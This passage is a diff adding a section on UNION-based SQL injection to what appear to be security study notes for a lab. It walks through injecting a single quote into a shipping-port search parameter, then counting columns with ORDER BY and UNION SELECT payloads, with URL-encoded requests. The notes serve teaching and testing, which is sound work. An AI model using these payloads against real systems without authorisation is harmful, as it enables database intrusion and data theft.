@@ -668,3 +668,79 @@ SELECT * FROM employees UNION SELECT dept_no, dept_name, NULL, NULL, NULL, NULL 
 ---
 
 ## Union Injections
+
+An attacker is targeting an application used to track shipping ports. He discovers a visible GET parameter.
+
+```
+http://94.237.54.192:55159/search.php?port_code=cn
+```
+
+![Filtered output](images/shipping-port.png)
+
+Based on the URL he assumes that the back-end SQL query looks something like this:
+
+```sql
+SELECT * FROM ports WHERE port_code = 'cn';
+```
+
+He initiates the SQL injection discovery process by injecting a single quote `'`, and observes the applications behavior. 
+
+```
+http://94.237.54.192:55159/search.php?port_code='
+```
+
+![Filtered output](images/union-injection2.png)
+
+The single quote `'` injection caused a SQL syntax error. This means that the attacker was able to input something that changed the SQL query being sent to the back-end database. This increases the probability of a SQL injection vulnerability being present. 
+
+The single quote `'` injection probably changed the SQL injection to look something like this:
+
+```sql
+SELECT * FROM ports WHERE port_code = ''';
+```
+
+The third single quote does not have a corresponding ending quote, resulting in the syntax error. 
+
+Before exploiting the application the attacker must determine how many columns the table has. He can accomplish this in two ways:
+
+- By using `ORDER BY`
+- By using a `UNION CLAUSE`
+
+**Method 1: `ORDER BY`**
+
+He repeatedly injects integers representing the column to sort by, and increments the integer by one, for every iteration. This continues until he gets an error message, stating that the column specified does not exist.  
+
+```sql
+' ORDER BY 1-- 
+' ORDER BY 2-- 
+' ORDER BY 3-- 
+' ORDER BY 4-- 
+' ORDER BY 5-- 
+```
+
+```
+http://94.237.54.192:55159/search.php?port_code=%27+ORDER+BY+5--+
+```
+
+He gets an error on the fifth column, meaning that the table has four columns.
+
+![Filtered output](images/order-by.png)
+
+**Method 2: `UNION`**
+
+The attacker performs repeated `UNION` injections with a different number of columns each time, starting at 1 and incrementing by one for each iteration. This continues until he gets a successful response. 
+
+```sql
+' UNION SELECT 1--  
+' UNION SELECT 1,2--  
+' UNION SELECT 1,2,3--  
+' UNION SELECT 1,2,3,4--  
+```
+
+```
+http://94.237.54.192:55159/search.php?port_code=%27+UNION+SELECT+1%2C2%2C3%2C4--+
+```
+
+The fourth column returns a successful response, meaning that the table has four columns.
+
+![Filtered output](images/union-select.png)
